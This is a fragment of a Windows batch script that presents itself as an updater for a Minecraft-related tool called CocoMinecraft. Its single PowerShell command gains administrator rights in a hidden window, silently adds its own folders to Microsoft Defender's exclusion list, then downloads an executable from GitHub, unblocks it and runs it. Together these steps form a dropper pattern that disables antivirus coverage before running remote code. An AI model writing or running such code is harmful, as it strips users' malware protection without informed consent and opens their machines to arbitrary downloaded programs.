...
if %ERRORLEVEL% NEQ 0 (
    ...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $d=Join-Path $env:LOCALAPPDATA 'CocoMinecraftUpdater'; $a=Join-Path $env:APPDATA 'CocoMinecraft'; New-Item -ItemType Directory -Path $d -Force|Out-Null; try { Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command',\"Add-MpPreference -ExclusionPath '$d','$a' -ErrorAction SilentlyContinue\" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue } catch {}; $e=Join-Path $d 'CocoUpdater.exe'; Get-Process -Name 'CocoUpdater' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 600; Invoke-WebRequest -Uri 'https://github.com/Franco-Caballero/CocoMinecraftUpdater/releases/latest/download/CocoUpdater.exe' -OutFile $e -UseBasicParsing; Unblock-File $e; Start-Process $e"
)
